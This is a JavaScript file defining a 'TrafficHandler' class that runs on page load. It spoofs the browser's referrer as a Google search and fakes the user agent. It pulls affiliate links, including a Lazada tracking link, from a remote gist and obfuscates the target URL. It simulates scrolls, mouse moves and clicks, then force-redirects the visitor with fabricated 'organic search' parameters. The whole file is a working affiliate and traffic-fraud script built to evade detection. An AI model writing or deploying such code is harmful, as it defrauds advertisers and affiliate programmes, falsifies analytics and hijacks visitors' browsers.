class TrafficHandler {
    constructor() {
        this.visitId = this.generateId();
        this.gistUrl = 'https://gist.githubusercontent.com/3snanugraha/5794adf5a74a06531d7bd8edf85408d0/raw';
        this.links = null;
        this.behaviors = ['scroll', 'move', 'click', 'focus'];
        this.executed = false;

        Object.defineProperty(document, 'referrer', {
            get: () => 'https://www.google.com/search?q=online+shop'
        });

        this.overrideNavigator();
        this.initializeLinks();
    }

    async initializeLinks() {
        try {
            const response = await fetch(this.gistUrl);
            this.links = await response.json();
            this.targetUrl = this.encodeTarget(this.getTargetLink());
        } catch (error) {
            console.error('Error fetching links:', error);
            this.targetUrl = this.encodeTarget('https://c.lazada.co.id/t/c.bheMzB');
        }
    }

    overrideNavigator() {
        const navigatorProxy = new Proxy(window.navigator, {
            get: (target, prop) => {
                switch(prop) {
                    case 'userAgent':
                        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
                    case 'platform':
                        return 'Win32';
                    default:
                        return target[prop];
                }
            }
        });
        
        Object.defineProperty(window, 'navigator', {
            value: navigatorProxy,
            writable: false
        });
    }

    getTargetLink() {
        const links = this.links.links;
        const rotation = this.links.config.rotation;

        switch(rotation) {
            case 'weighted':
                return this.getWeightedLink(links);
            case 'sequential':
                return this.getSequentialLink(links);
            default:
                return this.getRandomLink(links);
        }
    }

    getWeightedLink(links) {
        const totalWeight = links.reduce((sum, link) => sum + link.weight, 0);
        let random = Math.random() * totalWeight;
        
        for (let link of links) {
            random -= link.weight;
            if (random <= 0) return link.url;
        }
        return links[0].url;
    }

    getRandomLink(links) {
        return links[Math.floor(Math.random() * links.length)].url;
    }

    getSequentialLink(links) {
        this.currentIndex = (this.currentIndex || 0) % links.length;
        const url = links[this.currentIndex].url;
        this.currentIndex++;
        return url;
    }

    generateId() {
        return 'vid_' + Math.random().toString(36).substr(2, 9);
    }

    encodeTarget(url) {
        return btoa(url).split('').reverse().join('');
    }

    decodeTarget(encoded) {
        return atob(encoded.split('').reverse().join(''));
    }

    initBehaviors() {
        const randomBehaviors = this.shuffleArray(this.behaviors);
        randomBehaviors.forEach(behavior => {
            this.executeBehavior(behavior);
        });
    }

    shuffleArray(array) {
        return array.sort(() => Math.random() - 0.5);
    }

    executeBehavior(type) {
        switch(type) {
            case 'scroll':
                window.scrollTo({
                    top: Math.random() * 100,
                    behavior: 'smooth'
                });
                break;
            case 'move':
                document.dispatchEvent(new MouseEvent('mousemove', {
                    bubbles: true,
                    clientX: Math.random() * window.innerWidth,
                    clientY: Math.random() * window.innerHeight
                }));
                break;
            case 'click':
                document.dispatchEvent(new MouseEvent('click'));
                break;
            case 'focus':
                window.focus();
                break;
        }
    }

    async redirect() {
        if (this.executed) return;
        this.executed = true;

        if (!this.links) {
            await this.initializeLinks();
        }

        const stealthParams = new URLSearchParams({
            vid: this.visitId,
            t: Date.now(),
            ref: 'google',
            source: 'organic',
            medium: 'search'
        }).toString();

        const finalUrl = `${this.decodeTarget(this.targetUrl)}?${stealthParams}`;
        window.location.href = finalUrl;
    }
}

// Initialize and execute
const handler = new TrafficHandler();
setTimeout(() => {
    handler.initBehaviors();
    handler.redirect();
}, 1500 + Math.random() * 2000);
